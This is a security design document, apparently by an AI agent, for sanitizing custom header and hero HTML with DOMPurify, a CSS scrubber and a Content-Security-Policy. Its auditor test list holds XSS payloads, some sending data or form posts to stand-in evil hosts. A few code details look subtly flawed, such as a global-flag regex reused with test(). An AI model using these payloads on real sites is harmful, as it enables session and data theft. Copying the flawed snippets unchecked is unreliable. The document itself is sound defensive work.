# Custom Hero/Header Attacher — Security Design (Phase 2, agent 8)

**Status:** DESIGN ONLY. No code, no migrations executed. This doc owns the sanitizer module, the write+render defense-in-depth, the Content-Security-Policy backstop, the threat model, and the attack test list. It plugs into the contracts defined by the Architecture doc (`01-architecture.md` §3.1, §8, §10.1).

**Verified-now facts I am designing against (re-read this session):**
- **Zero sanitizer installed.** `package.json` has no `dompurify`/`isomorphic-dompurify`/`sanitize-html`/`xss`. New dep required.
- **Zero CSP today.** `next.config.ts:56-89` sets only `Cache-Control`. `src/middleware.ts` sets no security headers. Confirmed.
- **Inline scripts run unrestricted today.** `src/app/layout.tsx:40` mounts `<MetaPixelBootstrap>` in `<head>`; `meta-pixel-bootstrap.tsx:8-25` is a `dangerouslySetInnerHTML` inline `<script>`. The Pixel is **env-gated** — `pixelId={process.env.NEXT_PUBLIC_META_PIXEL_ID}` and returns `null` when absent (`meta-pixel-bootstrap.tsx:6`). So the inline-script CSP constraint only bites when that env var is set.
- **External runtime origins in use** (from grep): Mapbox (`api.mapbox.com` stylesheet in `layout.tsx:37`, plus GL tiles/events), Cloudinary (`api.cloudinary.com` upload XHR `simple-image-upload.tsx:108`, `confirmation-content.tsx:109`; `res.cloudinary.com` images), OpenStreetMap Nominatim (`nominatim.openstreetmap.org` geocode), Sentry (`*.ingest.sentry.io` DSN — but **tunneled through `/monitoring`** per `next.config.ts:113`, so first-party), Convex (`*.convex.cloud` over **WSS** per-tenant), Facebook (`connect.facebook.net` Pixel loader script, `www.facebook.com/tr` pixel img + OAuth).
- **Render uses `dangerouslySetInnerHTML`** in `<CustomHeader>`/`<CustomHero>` (Architecture §3.1) — same React tree, not an iframe.
- Existing CSS-injection precedent is regex-only (`branding-utils.ts:414` `sanitizeCSSColor`, `hero-block-schemas.ts:10-34`). It is value-level, not markup-level — insufficient for free-form HTML. We need a real HTML sanitizer.

---

## 0. Decision: same-tree sanitize, NOT iframe sandbox

**Iframe sandbox is rejected** because the cart trigger must be a live React node portaled into a marker *inside* the custom header (Architecture §3, the HARD REQUIREMENT) — an `<iframe sandbox>` is a separate document/origin/React tree, so `createPortal` cannot reach into it and the live `item_count`/`setIsCartOpen` closures cannot drive a button across the frame boundary (would require `postMessage` RPC, breaking the "platform-owned reactive trigger" guarantee and adding a far larger attack/complexity surface).

Therefore defense = **strict allowlist sanitization (isomorphic-dompurify) on write AND render**, backstopped by a **Content-Security-Policy** that denies script execution even if sanitization is ever bypassed (mutation-XSS). Two independent layers; neither alone is the whole defense.

---

## 1. The sanitizer

### 1.1 Dependency

Add **`isomorphic-dompurify`** (NOT bare `dompurify`).

- Rationale: the same `sanitizeChromeHtml()` runs in the **superadmin server action** (write path, Node — no `window`) and in the **client component** (render path, browser). `isomorphic-dompurify` ships DOMPurify + `jsdom` and auto-selects the right `window` per environment, so one module/one config serves both paths with identical rules. Bare `dompurify` needs a manual `jsdom` window on the server; isomorphic wraps that.
- It is a mature, well-audited library — strongly preferred over hand-rolling, which the regex precedents (`hero-block-schemas.ts`) are explicitly too weak for (free-form markup, not bounded value strings).
- Pin a current version; DOMPurify ships frequent mutation-XSS fixes — add a note to keep it patched (Dependabot already runs on this repo via lockfile churn).

### 1.2 Module

New file: `src/lib/sanitize-chrome-html.ts`. Single export consumed by both write and render paths (Architecture §10.1):

```ts
import DOMPurify from 'isomorphic-dompurify'

export function sanitizeChromeHtml(dirty: string): string { /* config below */ }
```

### 1.3 Exact DOMPurify config

```ts
const CHROME_PURIFY_CONFIG = {
  // ── Structural + text + media tags suitable for header/hero LOOK ──
  ALLOWED_TAGS: [
    // layout / sectioning
    'div', 'span', 'header', 'nav', 'section', 'article', 'aside', 'footer',
    'main', 'figure', 'figcaption',
    // text
    'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
    'p', 'a', 'b', 'strong', 'i', 'em', 'u', 's', 'small', 'mark',
    'br', 'hr', 'blockquote', 'address', 'time', 'abbr',
    // lists
    'ul', 'ol', 'li', 'dl', 'dt', 'dd',
    // media (look-only)
    'img', 'picture', 'source',
    // decorative SVG (logos / icons baked into the HTML)
    'svg', 'path', 'g', 'circle', 'rect', 'line', 'polyline', 'polygon',
    'ellipse', 'defs', 'linearGradient', 'radialGradient', 'stop', 'use', 'symbol',
    'title', 'desc',
    // decorative-only button (no behavior; cart is portaled, see ADD below)
    'button',
    // CSS for look (scoped — see §1.5)
    'style',
  ],

  ALLOWED_ATTR: [
    // global look attrs
    'class', 'id', 'style', 'title', 'role', 'lang', 'dir',
    // links (URI-filtered below)
    'href', 'target', 'rel',
    // media
    'src', 'srcset', 'sizes', 'alt', 'width', 'height', 'loading',
    'decoding', 'media', 'type', 'poster',
    // svg presentation
    'viewBox', 'xmlns', 'fill', 'stroke', 'stroke-width', 'stroke-linecap',
    'stroke-linejoin', 'd', 'cx', 'cy', 'r', 'x', 'y', 'x1', 'y1', 'x2', 'y2',
    'points', 'rx', 'ry', 'transform', 'gradientUnits', 'offset', 'stop-color',
    'stop-opacity', 'opacity', 'preserveAspectRatio', 'aria-hidden', 'aria-label',
    // accessibility
    'aria-labelledby', 'aria-describedby', 'tabindex',
  ],

  // ── Hard denials (belt-and-suspenders on top of the allowlist) ──
  FORBID_TAGS: [
    'script', 'iframe', 'object', 'embed', 'form', 'input', 'textarea',
    'select', 'option', 'button[type=submit]', // see note: submit handled via FORBID_ATTR/strip
    'link', 'meta', 'base', 'template', 'noscript', 'frame', 'frameset',
    'applet', 'audio', 'video', 'track', 'math', 'foreignObject',
    'animate', 'animateTransform', 'set', 'script', // svg-borne script vectors
  ],
  FORBID_ATTR: [
    // belt-and-suspenders: DOMPurify already strips ALL on* by default,
    // but list the common ones so intent is explicit and a future
    // ADD_ATTR mistake can't silently re-enable them.
    'onerror', 'onload', 'onclick', 'onmouseover', 'onfocus', 'onanimationstart',
    'onanimationend', 'ontoggle', 'onbegin', 'onpointerover',
    'formaction', 'action', 'background', 'ping', 'srcdoc',
    'xlink:href', // svg js vector (javascript: in xlink:href)
  ],

  // ── URL policy ──
  ALLOWED_URI_REGEXP:
    /^(?:(?:https?|mailto|tel):|[^a-z]|[a-z+.-]+(?:[^a-z+.:-]|$))/i,
  //  ↑ DOMPurify's default-style regexp: permits https:, http:, mailto:, tel:,
  //    protocol-relative (//), relative/anchor (#, /, ./) — and any scheme that
  //    is NOT a known dangerous one is rejected by the trailing alternation.
  //    This BLOCKS javascript:, vbscript:, file:, and data: (data handled below).

  // data:image allow (base64 inline images) — block all other data: payloads
  ADD_DATA_URI_TAGS: ['img', 'source'],
  // NOTE: ADD_DATA_URI_TAGS alone is too permissive (allows data:text/html on img
  // in some versions). We pair it with an afterSanitizeAttributes hook (§1.4) that
  // re-validates every src/href against an explicit data:image allow-regex.

  // ── Keep our platform markers through sanitization (Architecture §3.1) ──
  ADD_ATTR: ['data-wn-cart-mount', 'data-wn-custom-header', 'data-wn-custom-hero'],
  // Generic data-* are allowed by DOMPurify default (ALLOW_DATA_ATTR: true), which
  // already preserves data-wn-cart-mount; we list them explicitly so an accidental
  // ALLOW_DATA_ATTR:false can't strip the cart mount and break the HARD REQUIREMENT.

  // ── Anti-mutation-XSS hardening ──
  SANITIZE_DOM: true,         // namespace confusion protection
  FORBID_CONTENTS: ['script', 'style'], // don't trust nested contents of forbidden nodes
  WHOLE_DOCUMENT: false,      // we inject a fragment into a <div>, not a full doc
  RETURN_TRUSTED_TYPE: false, // we hand the string to dangerouslySetInnerHTML ourselves
  USE_PROFILES: { html: true, svg: true }, // enable SVG profile alongside our allowlist
} as const
```

**Notes / decisions baked in above:**

- **`on*` handlers (D1):** DOMPurify strips **all** `on*` event-handler attributes **by default** — confirmed behavior, not optional. We additionally list the common ones in `FORBID_ATTR` purely as documentation + a guard against a future `ADD_ATTR` re-enabling them. (DOMPurify will not honor an `on*` in `ADD_ATTR` unless `ALLOW_UNKNOWN_PROTOCOLS`/explicit overrides are set — we set none.)
- **`javascript:`/`vbscript:` URLs:** killed by `ALLOWED_URI_REGEXP`.
- **`data:` URLs:** `data:text/html`, `data:application/*`, `data:image/svg+xml` (SVG can carry script) are all blocked; **only** raster `data:image/png|jpe?g|gif|webp;base64` survive — enforced by the §1.4 hook, not by `ADD_DATA_URI_TAGS` alone.
- **`button`:** allowed as a *decorative* element only. It has no `on*` (stripped) and no `type=submit` honored (no `form` allowed, `formaction`/`action` forbidden), so it cannot submit or run JS. The *functional* cart button is the platform-portaled `<CartTriggerButton>` (Architecture §2.3), not tenant markup.
- **`form`/inputs forbidden:** prevents credential-harvesting overlays and CSRF-style auto-submit; LOOK-only has no need for forms.
- **`a target=_blank`:** allowed, but the §1.4 hook force-adds `rel="noopener noreferrer"` to defeat reverse-tabnabbing.

### 1.4 `afterSanitizeAttributes` hook (the load-bearing extra checks)

DOMPurify's URI regexp is necessary but not sufficient for the `data:image`-only rule and tabnabbing. Register a hook (idempotent, registered once at module load):

```ts
const DATA_IMAGE_RE = /^data:image\/(png|jpe?g|gif|webp);base64,[a-z0-9+/=\s]+$/i
const SAFE_URL_RE   = /^(https?:|mailto:|tel:|\/|#|\.\/|\.\.\/)/i

DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  // 1. data:image allow-only on src; everything else must match SAFE_URL_RE
  for (const attr of ['src', 'href', 'poster']) {
    const v = node.getAttribute?.(attr)
    if (!v) continue
    const isDataImg = DATA_IMAGE_RE.test(v.trim())
    const isSafe    = SAFE_URL_RE.test(v.trim())
    if (!isDataImg && !isSafe) node.removeAttribute(attr)
  }
  // 2. srcset: drop entirely if any candidate is non-safe (cheap + strict)
  const srcset = node.getAttribute?.('srcset')
  if (srcset && /(^|[\s,])data:(?!image\/(png|jpe?g|gif|webp);base64)/i.test(srcset))
    node.removeAttribute('srcset')
  // 3. tabnabbing: any anchor with target gets rel hardened
  if (node.tagName === 'A' && node.getAttribute('target'))
    node.setAttribute('rel', 'noopener noreferrer')
})
```

Run `sanitizeChromeHtml` = `DOMPurify.sanitize(dirty, CHROME_PURIFY_CONFIG)` after the hook is installed.

### 1.5 Inline `style` attributes and `<style>` blocks — ALLOWED, with CSS neutralization

**Decision: allow inline `style=""` and `<style>` blocks** — LOOK-only is impossible without CSS, and the whole feature exists so superadmins can fully style header/hero. But CSS is itself an XSS/exfiltration vector, so we neutralize:

- **DOMPurify keeps `<style>` contents largely verbatim** — it does **not** deeply parse CSS. This is a known mutation-XSS / CSS-injection surface. We mitigate with a dedicated CSS scrubber applied in the same hook to both the `style` attribute and `<style>` element text content:

```ts
// dangerous CSS tokens to strip from any style attr or <style> text
const CSS_KILL = /(expression\s*\(|url\s*\(\s*['"]?\s*(javascript|vbscript|data:text)|behavior\s*:|-moz-binding|@import|javascript:|vbscript:)/gi

DOMPurify.addHook('uponSanitizeElement', (node, data) => {
  if (data.tagName === 'style' && node.textContent) {
    if (CSS_KILL.test(node.textContent)) {
      node.textContent = node.textContent.replace(CSS_KILL, '/*blocked*/')
    }
  }
})
DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  // (append to the §1.4 hook body)
  const style = node.getAttribute?.('style')
  if (style && CSS_KILL.test(style))
    node.setAttribute('style', style.replace(CSS_KILL, ''))
})
```

This removes: `expression()` (legacy IE script-in-CSS), `url(javascript:|vbscript:|data:text...)`, `behavior:`/`-moz-binding` (HTC/XBL script binding), and `@import` (untrusted-stylesheet pull / data exfiltration). `url()` to images is preserved.

- **`<style>` scope risk + recommendation:** a tenant `<style>` block is NOT scoped — selectors like `* { display:none }` or `body{}` could affect the whole page (the custom wrapper is in the same tree). **Mitigation (recommended for the implementer, owned jointly with Architecture §2.1):** wrap the rendered custom HTML in a container with a unique class (e.g. `.wn-custom-header`) and, at save time, run a lightweight CSS prefixer that scopes top-level selectors to that container, OR document for superadmins that selectors must be self-scoped. Minimum bar for *security* (not just style-bleed): the `CSS_KILL` scrub above is mandatory; selector-scoping is a UX/safety nicety. Because **only superadmins** author this HTML (D2), the style-bleed blast radius is low-trust-but-not-hostile; the hard security guarantee is "no script, no exfil channel," which `CSS_KILL` + CSP (§3) provide.
- **CSS exfiltration via `url()` on attribute selectors** (e.g. `input[value^="a"]{background:url(//evil/a)}`) is real but **n/a here**: `input`/`textarea`/`form` are forbidden tags, so there are no secret-bearing form fields in the custom region to leak. The page's real inputs (checkout, login) live on *other routes*, outside this DOM. CSP `img-src`/`default-src` (§3) further constrains where `url()` can fetch.

### 1.6 What is explicitly stripped (mapping to D1)

| D1 requirement | Mechanism |
|---|---|
| Strip `<script>` | `FORBID_TAGS` + not in `ALLOWED_TAGS` + CSP `script-src` (§3) |
| Strip all `on*` handlers | DOMPurify default + `FORBID_ATTR` belt |
| `javascript:`/`vbscript:` URLs | `ALLOWED_URI_REGEXP` + §1.4 hook |
| `data:` URLs (except safe `data:image`) | §1.4 `DATA_IMAGE_RE` allow-only |
| Dangerous CSS: `expression()`, `url(javascript:)`, `behavior`, `@import` | §1.5 `CSS_KILL` scrub on attr + `<style>` |
| Keep `data-wn-cart-mount` marker alive | `ADD_ATTR` + default `ALLOW_DATA_ATTR` |

---

## 2. Defense in depth: sanitize on WRITE **and** on RENDER

Both, not one.

### 2.1 Sanitize on WRITE (superadmin save action)

In the superadmin save path (persistence agent's action; D2 — `createTenantSupabase`/`updateTenantSupabase` or a dedicated superadmin action), call `sanitizeChromeHtml()` on `custom_header_html` and `custom_hero_html` **before** the Supabase `update`, and **store the sanitized output** (not the raw input).

- **Why store sanitized:** the row at rest is then already-clean, so any other read path (a future SSR render, an export, an admin preview, a direct DB consumer) gets safe HTML by construction — not dependent on every reader remembering to sanitize.
- **Conflict flag vs Architecture §10.2:** the Architecture doc *recommends "store raw so the superadmin sees what they typed and the editable field round-trips."* **I disagree on security grounds and override for the stored value.** Resolution that satisfies both: **store sanitized HTML in the column** (security-of-record), and if round-trip fidelity matters for the editor, the form may *additionally* show a non-persisted "as-typed" preview in component state only — but the persisted, served value is always sanitized. Net: the served `custom_header_html`/`custom_hero_html` is sanitized-at-rest. (This is a deliberate, flagged deviation from 01-architecture §10.2; the render-time sanitizer below means it is safe either way, but storing sanitized is strictly safer.)
- **Save-time validation gate (cart invariant, Architecture §3.6):** after sanitizing the header HTML, `.refine()` that the sanitized output still contains exactly one `[data-wn-cart-mount]`; reject otherwise (so a tenant can't save a header that would have no cart). This runs on the **post-sanitize** string so it reflects what will actually render.

### 2.2 Re-sanitize on RENDER (client component)

In `<CustomHeader>`/`<CustomHero>` (Architecture §3.1), call `sanitizeChromeHtml()` again, memoized on the raw string, immediately before `dangerouslySetInnerHTML`.

- **Why also at render:** the stored value could be tampered with out-of-band (direct DB write, a bug in a future migration/import, a restore from a pre-sanitizer backup, or simply a config rolled back to a version with weaker write rules). Render-time sanitization makes the *display* path self-defending regardless of how the bytes got into the column. It is cheap (memoized on `html`, only re-runs when the string changes — not on cart re-renders, per Architecture §3.1).
- Idempotent: sanitizing already-clean HTML is a no-op, so write+render double-sanitize has no functional cost beyond one memoized pass.

**Result:** two independent enforcement points + a CSP backstop = three layers. A bypass requires defeating DOMPurify's allowlist (mutation-XSS) **and** the CSP simultaneously.

---

## 3. Content-Security-Policy backstop (NEW — none exists)

A CSP is the runtime net that stops script execution even if a mutation-XSS slips past DOMPurify. Today there is none (§verified). Add one.

### 3.1 Rollout: Report-Only FIRST

Because the app currently runs with zero CSP and several inline scripts/3rd-party loaders, ship as **`Content-Security-Policy-Report-Only`** first for ≥1 week, watch Sentry/console for violations, then flip the header name to enforcing. This avoids breaking Meta Pixel, Mapbox GL, Cloudinary, Sentry tunnel, Convex WSS, or Facebook OAuth on day one.

### 3.2 `script-src` decision — **nonce**, with `'strict-dynamic'`, NOT `'unsafe-inline'`

The only first-party inline `<script>` is the **env-gated** Meta Pixel (`meta-pixel-bootstrap.tsx`).

- **Chosen: per-request nonce.** Generate a nonce in `middleware.ts` (it already runs on every request and constructs the response), expose it to the inline script. **Two sub-options:**
  - (a) **If `NEXT_PUBLIC_META_PIXEL_ID` is unset (the common/default case): no inline script renders at all** → `script-src 'self' https://connect.facebook.net 'strict-dynamic' 'nonce-…'` works with nothing to whitelist for the pixel. Simplest.
  - (b) **If the Pixel IS configured:** add `nonce={nonce}` to the `<script>` in `meta-pixel-bootstrap.tsx` (one-line change, hand to the persistence/UI agent — out of *this* doc's edit scope but called out here), and allow `https://connect.facebook.net` (the loader the inline script injects — covered automatically by `'strict-dynamic'` once the nonced root script runs).
- **Why not hash:** the Pixel snippet interpolates `${pixelId}` so its bytes vary per tenant/env → a static hash is brittle. Nonce is stable against content changes.
- **Why not `'unsafe-inline'`:** that would negate the entire backstop (any injected inline `<script>` would run) — the whole point of the CSP layer is to stop exactly that.
- **Next.js note:** Next 15 supports nonce-based CSP via middleware (`x-nonce` header pattern). Framework-injected inline bootstrap scripts are covered by `'strict-dynamic'` + the propagated nonce. Verify Next's own runtime inline scripts pick up the nonce (Next reads CSP from the response header to nonce its scripts).

### 3.3 The exact policy (Report-Only first, then enforce)

Header key during rollout: `Content-Security-Policy-Report-Only`; after validation: `Content-Security-Policy`. Set in `next.config.ts` `headers()` for `source: '/:path*'` (global) **or**, preferably, in `middleware.ts` so the per-request `nonce` can be interpolated (static `next.config.ts` headers cannot hold a per-request nonce → if using `next.config.ts`, you cannot use nonce and must fall back to hashes for the Pixel; **recommendation: set CSP in middleware** to keep the nonce).

```
default-src 'self';
base-uri 'self';
object-src 'none';
frame-ancestors 'none';
form-action 'self';
script-src 'self' 'nonce-{NONCE}' 'strict-dynamic' https://connect.facebook.net;
style-src 'self' 'unsafe-inline' https://api.mapbox.com;
img-src 'self' data: blob: https://res.cloudinary.com https://images.unsplash.com https://via.placeholder.com https://www.facebook.com https://*.mapbox.com;
font-src 'self' data:;
connect-src 'self' https://api.cloudinary.com https://api.mapbox.com https://events.mapbox.com https://nominatim.openstreetmap.org https://*.convex.cloud wss://*.convex.cloud https://connect.facebook.net https://*.ingest.sentry.io https://*.ingest.us.sentry.io;
worker-src 'self' blob:;
child-src 'self' blob:;
frame-src 'self' https://www.facebook.com;
media-src 'self';
manifest-src 'self';
upgrade-insecure-requests
```

(Single-line for the header value; newlines above are for readability — emit as `directive; directive; ...`.)

**Directive justification (and why each existing feature keeps working):**

| Directive | Why / what it protects | Don't-break note |
|---|---|---|
| `default-src 'self'` | baseline deny for anything not overridden | — |
| `object-src 'none'` | kills `<object>/<embed>` Flash/plugin XSS | tenant HTML forbids these tags too |
| `frame-ancestors 'none'` | **clickjacking** defense — page can't be framed | menu page is never framed by us |
| `frame-src 'self' https://www.facebook.com` | Facebook OAuth/login dialog may use a frame | keeps FB OAuth working |
| `form-action 'self'` | injected `<form action=evil>` can't post offsite | tenant forms are forbidden anyway |
| `script-src` nonce + `'strict-dynamic'` + FB | Meta Pixel loader (`connect.facebook.net`); blocks all un-nonced inline/injected scripts (the §1 sanitizer + this = double script kill) | Pixel works via nonce (§3.2); Next's own scripts get the nonce |
| `style-src 'self' 'unsafe-inline' https://api.mapbox.com` | **`'unsafe-inline'` is required** — the app uses massive inline `style={...}` (branding, the `--brand-*` wrapper from Architecture §6, Tailwind/Radix runtime styles, chart.tsx CSS) and the Mapbox CSS link is cross-origin | DOES NOT weaken script defense; style-based XSS is already neutralized by §1.5 `CSS_KILL`. (Nonce-ing every inline style across the app is infeasible; `'unsafe-inline'` for styles is the standard, accepted tradeoff.) |
| `img-src` | `data:` (our `data:image` base64 + Next blur placeholders use `data:`/`blob:`), Cloudinary/Unsplash/placeholder (next/image allowlist), `www.facebook.com` (Pixel noscript img), `*.mapbox.com` (tiles) | raw `<img>` in tenant HTML is constrained to these origins + `data:image` |
| `connect-src` | Cloudinary upload XHR, Mapbox tiles/events, Nominatim geocode, **Convex WSS** (`wss://*.convex.cloud` — real-time orders), Sentry ingest, FB | keeps uploads/maps/realtime/error-reporting alive |
| `worker-src/child-src blob:` | Mapbox GL + Sentry Replay spawn web workers from `blob:` | prevents "worker blocked" breakage |
| `font-src 'self' data:` | next/font (Geist) self-hosts; `data:` for inlined glyphs | — |
| `upgrade-insecure-requests` | force https on any `http:` `url()`/`src` in tenant HTML | hardens mixed-content |

**Sentry note:** because Sentry is **tunneled through `/monitoring`** (`next.config.ts:113`), browser→Sentry traffic is same-origin and covered by `'self'` in `connect-src`; the explicit `*.ingest.sentry.io` entries are a safety net for any non-tunneled path and source-map fetches. **Cloudinary upload widget:** the codebase uploads via direct `XHR` to `api.cloudinary.com` (no `widget.cloudinary.com` script found), so `connect-src` covers it; **no** `widget.cloudinary.com` `script-src` entry is needed (add it only if a widget is later introduced).

### 3.4 Scope of the CSP

Apply the CSP **globally** (`/:path*` in middleware), not just the menu route — a backstop is only useful if uniform, and the directives above are validated against the whole app's known origins. The Report-Only phase will surface any route-specific origin we missed before enforcing.

---

## 4. Threat model + residual risks

| Threat | Vector | Mitigation | Residual |
|---|---|---|---|
| **Stored XSS** | superadmin pastes `<script>`/`on*`/`javascript:` | DOMPurify allowlist on write+render (§1, §2) + CSP `script-src` nonce (§3) | Requires defeating DOMPurify **and** CSP simultaneously. Low. |
| **Mutation-XSS (mXSS)** | namespace/parser-differential payload that re-forms into script after DOMPurify | `SANITIZE_DOM`, `USE_PROFILES`, no `WHOLE_DOCUMENT`, **keep `isomorphic-dompurify` patched**; **CSP is the backstop** — even a successful mXSS yields a non-nonced inline script the CSP refuses to run | Theoretical zero-day in DOMPurify; CSP contains it to non-execution. |
| **CSS exfiltration** | `@import`/`url()`/attribute-selector tricks to leak data or pull stylesheets | §1.5 `CSS_KILL` strips `@import`/`expression`/`behavior`/`url(javascript:)`; no form fields in region to leak; `img-src`/`default-src` constrain `url()` targets | Style-bleed (visual) possible from unscoped `<style>` — UX/trust issue, not exfil; superadmin-only authorship (D2) bounds it. |
| **Clickjacking** | embedding the menu in a hostile frame to trick clicks | `frame-ancestors 'none'` (§3) | None for our page. (We don't control where a tenant links out.) |
| **Reverse tabnabbing** | `<a target=_blank>` to attacker page that rewrites `window.opener` | §1.4 hook force-sets `rel="noopener noreferrer"` on any `target` anchor | None. |
| **`data:` image abuse** | `data:text/html` / `data:image/svg+xml` (SVG carries script) smuggled in `src` | §1.4 allows ONLY `data:image/(png|jpe?g|gif|webp);base64`; SVG-as-data blocked; inline `<svg>` allowed but `<script>`/`<animate>`/`foreignObject`/`on*` stripped | Raster-only inline images. |
| **SSRF via `<img src>`** | server-side fetch of attacker URL | **N/A** — rendering is client-side (`dangerouslySetInnerHTML` in browser); the browser fetches images, not our server. Write-time sanitize runs in Node but never fetches the URLs. | None. |
| **Phishing / credential capture** | fake login `<form>` overlay in header | `form`/`input` forbidden tags (§1.3); `form-action 'self'` (§3) | None via forms; visual look-alike text still possible (superadmin-only authorship bounds it). |
| **Cart hijack / break** (HARD REQ) | tenant markup removes/overlays the cart, or marker missing | Cart trigger is platform React portaled in (Architecture §3); marker-missing → fall back to `<DefaultHeader>` (Architecture §3.6); save-time `.refine` requires the marker (§2.1) | None — cart present in every path. |
| **Style-bleed onto cart/menu** | tenant `<style>` hides/moves global elements | recommend selector-scoping (§1.5); CSP doesn't help here | Visual only; superadmin-authored; acceptable with scoping guidance. |
| **Denial via huge payload** | multi-MB HTML string | enforce a max length in the Zod schema (e.g. 64 KB) at save (persistence agent) | Bounded. |

**Trust note (from MEMORY):** the QR-handoff deferred-auth memory is unrelated to this feature; the relevant trust assumption here is D2 — **only superadmins author this HTML**, so the primary threat is *accidental* breakage + a compromised-superadmin / stored-payload scenario, both covered by sanitize-on-render + CSP. This is not a hostile-tenant input surface.

---

## 5. Attack test list for Phase 4 Security Auditor

Each payload is placed in `custom_header_html` (and `custom_hero_html` where relevant), saved via the superadmin path, and rendered on `/<tenant>/menu`. **Pass = neutralized (no script exec, no offsite fetch, no escape) AND the cart still opens/updates/checks-out.** Run against both the write-stored value and the rendered DOM.

1. **Inline script:** `<script>window.__pwned=1;alert(document.cookie)</script>` → expect: tag removed, `window.__pwned` undefined, CSP would block even if present.
2. **Img onerror:** `<img src=x onerror="window.__pwned=1">` → expect: `onerror` stripped, no exec.
3. **SVG onload:** `<svg onload="alert(1)"><circle r=10></svg>` → expect: `onload` stripped, `<svg>` kept clean.
4. **SVG-borne script:** `<svg><script>alert(1)</script></svg>` and `<svg><animate onbegin=alert(1)>` → expect: `<script>`/`<animate>`/`onbegin` removed.
5. **javascript: href:** `<a href="javascript:alert(1)">x</a>` → expect: `href` removed/neutralized.
6. **data:text/html:** `<a href="data:text/html,<script>alert(1)</script>">x</a>` and `<img src="data:text/html;base64,...">` → expect: `href`/`src` removed (only `data:image` raster allowed).
7. **data:image/svg+xml:** `<img src="data:image/svg+xml;base64,PHN2Zy...">` → expect: removed (SVG-as-data can carry script).
8. **CSS expression:** `<div style="width:expression(alert(1))"></div>` → expect: `expression(` scrubbed by `CSS_KILL`.
9. **CSS url(javascript:):** `<div style="background:url(javascript:alert(1))"></div>` → expect: scrubbed.
10. **CSS behavior / -moz-binding:** `<div style="behavior:url(#x)"></div>`, `<style>div{-moz-binding:url(//evil/x.xml#y)}</style>` → expect: scrubbed.
11. **@import exfil:** `<style>@import 'https://evil.example/leak.css';</style>` → expect: `@import` scrubbed; `connect-src`/`style-src` blocks the fetch as backstop.
12. **Iframe:** `<iframe src="https://evil.example"></iframe>` and `<iframe srcdoc="<script>...">` → expect: tag + `srcdoc` removed; `frame-src` backstop.
13. **object/embed:** `<object data="x.swf">`, `<embed src="x">` → expect: removed; `object-src 'none'` backstop.
14. **Form phishing:** `<form action="https://evil/steal"><input name=card></form>` → expect: `form`/`input` removed; `form-action 'self'` backstop.
15. **base tag hijack:** `<base href="https://evil/">` → expect: removed (relative-URL hijack defense).
16. **meta refresh redirect:** `<meta http-equiv="refresh" content="0;url=https://evil">` → expect: removed.
17. **Container escape via malformed nesting:** `</div></header><script>alert(1)</script>` and unbalanced tags → expect: DOMPurify re-balances into the fragment; no breakout into the page; cart marker intact.
18. **mXSS classics:** `<noscript><p title="</noscript><img src=x onerror=alert(1)>">` ; `<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>` ; `<svg></p><style><a id="</style><img src=x onerror=alert(1)>"></a>` → expect: no exec (DOMPurify mXSS handling + `foreignObject`/`math` forbidden + CSP backstop).
19. **xlink:href js:** `<svg><use xlink:href="javascript:alert(1)"/></svg>` → expect: `xlink:href` forbidden/stripped.
20. **Tabnabbing:** `<a target="_blank" href="https://evil">x</a>` → expect: `rel="noopener noreferrer"` added.
21. **Cart-mount removal:** header HTML with NO `data-wn-cart-mount` → expect: save **rejected** by `.refine` (§2.1); if forced into DB, render falls back to `<DefaultHeader>` (Architecture §3.6) — **cart still present**.
22. **Cart-mount overlay/hide:** `<style>[data-wn-cart-mount]{display:none}</style>` or a high-z-index `<div>` over the cart → expect: documents the style-bleed residual; cart still functional via drawer; flag for scoping. (Not a script vuln; verify cart remains operable.)
23. **Duplicate marker:** two `[data-wn-cart-mount]` → expect: save `.refine` requires exactly one → rejected (avoids ambiguous portal target).
24. **Huge payload:** >64 KB string → expect: rejected by Zod max-length (§4).
25. **Double-encoded protocol:** `<a href="jav&#x09;ascript:alert(1)">` / `java\tscript:` → expect: DOMPurify decodes + URI regexp blocks.
26. **Polyglot data-image bypass attempt:** `<img src="data:image/png;base64,...><script>...">` (payload after a fake base64) → expect: `DATA_IMAGE_RE` anchored `$` rejects trailing markup.

Audit also confirms: with CSP enforcing, **Meta Pixel still fires** (when env set), **Mapbox autocomplete loads tiles/CSS**, **Cloudinary upload succeeds**, **Sentry replay/tunnel works**, **Convex realtime orders connect over WSS**, **Facebook OAuth completes** — i.e. the CSP did not regress existing functionality (run the Report-Only phase to verify before enforcing).

---

## 6. Contracts I hand back to other agents (deltas to 01-architecture §10)

1. **Render boundary (Architecture agent):** import `sanitizeChromeHtml` from `src/lib/sanitize-chrome-html.ts`; memoize on the raw string (already specified in Architecture §3.1). No change to the portal mechanism.
2. **Persistence agent (write path):** call `sanitizeChromeHtml()` on both HTML columns before `update` and **store the sanitized result** (this OVERRIDES Architecture §10.2's "store raw" recommendation — flagged conflict, resolved in §2.1). Add Zod `.max(65536)` and the post-sanitize `[data-wn-cart-mount]` exactly-one `.refine` to `custom_header_html`. Add `isomorphic-dompurify` to `package.json`.
3. **CSP owner (persistence/infra agent):** add the §3.3 policy via **middleware** (for the nonce) as `Content-Security-Policy-Report-Only` first; thread the nonce to `meta-pixel-bootstrap.tsx`'s `<script nonce>` (one-line edit) only if the Pixel env var is set; flip to enforcing after the Report-Only window is clean.
4. **Superadmin form (UI agent):** the live preview should render through the same `sanitizeChromeHtml` so the superadmin sees exactly the sanitized output they are persisting (not their raw paste) — keeps WYSIWYG honest.

---

## 7. Summary of security decisions

- **No iframe** (breaks the cart portal); same-tree sanitize instead.
- **`isomorphic-dompurify`**, one shared `sanitizeChromeHtml()`, strict allowlist (§1.3) + URI/CSS hooks (§1.4–1.5).
- **Allow** inline `style` and `<style>` (look needs CSS); neutralize `expression()/url(javascript:)/behavior/@import` via `CSS_KILL`; recommend selector-scoping for style-bleed.
- **Sanitize on write (store sanitized) AND on render** — three layers with the CSP.
- **Add a CSP** (none today): nonce-based `script-src` keeping Meta Pixel alive, `style-src 'unsafe-inline'`, `frame-ancestors 'none'`, `object-src 'none'`, full allowlist for Cloudinary/Mapbox/Nominatim/Convex-WSS/Sentry/Facebook; ship **Report-Only first**, then enforce.
- **Cart invariant** preserved by `[data-wn-cart-mount]` allowlisting + save-time `.refine` + `<DefaultHeader>` fallback.
